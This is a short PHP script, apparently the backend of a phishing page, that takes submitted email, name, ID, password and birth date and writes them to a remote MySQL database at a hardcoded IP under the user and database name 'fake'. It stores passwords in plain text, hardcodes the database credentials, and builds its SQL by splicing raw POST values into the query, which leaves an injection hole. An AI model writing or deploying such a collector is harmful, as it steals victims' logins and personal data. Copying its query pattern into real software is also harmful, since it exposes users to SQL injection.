<?php
$db= mysqli_connect('35.160.127.179:3306','fake','true7102','fake');
$mail=$_POST['mail'];
$name=$_POST['name'];
$id=$_POST['id0'];
$pass=$_POST['pass'];
$date=$_POST['day'];
$mois=$_POST['month'];
$an=$_POST['year'];
$db->query("INSERT INTO asksign VALUES('$mail','$name','$id','$pass','$date','$mois','$an')");

 ?>
